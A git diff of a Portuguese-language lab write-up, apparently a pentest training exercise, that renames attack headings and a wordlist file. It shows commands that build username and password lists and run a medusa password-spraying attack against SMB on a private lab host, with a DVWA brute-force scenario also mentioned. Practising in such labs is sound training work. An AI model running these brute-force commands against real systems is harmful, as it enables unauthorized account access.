@@ -151,7 +151,7 @@ ftp 192.168.56.101
 
 ---
 
-## 🌐 Ataque 2: Força Bruta em Aplicação Web (DVWA)
+## 🌐 Cenário 2: Força Bruta em Aplicação Web (DVWA)
 
 ### ✔️ Acesso à Aplicação
 
@@ -185,19 +185,19 @@ Nesta etapa o navegador retorna todas as tentativas como sucesso, erro interno d
 
 ---
 
-## 💻 Ataque 3: Password Spraying em SMB
+## 💻 Cenário 3: Password Spraying em SMB
 
-### ✔️ Criação das Listas
+### ✔️ Criação das WordLists
 
 ```bash
 echo -e "user\nmsfadmin\nservice" > smb_users.txt
-echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+echo -e "password\n123456\nWelcome123\nmsfadmin" > smb_pass.txt
 ```
 
 ### ✔️ Execução do Ataque
 
 ```bash
-medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+medusa -h 192.168.56.101 -U smb_users.txt -P smb_pass.txt -M smbnt -t 2 -T 50
 ```
 
 ![Password spraying SMB](images/12.passwordsprayngcommedusa.png)
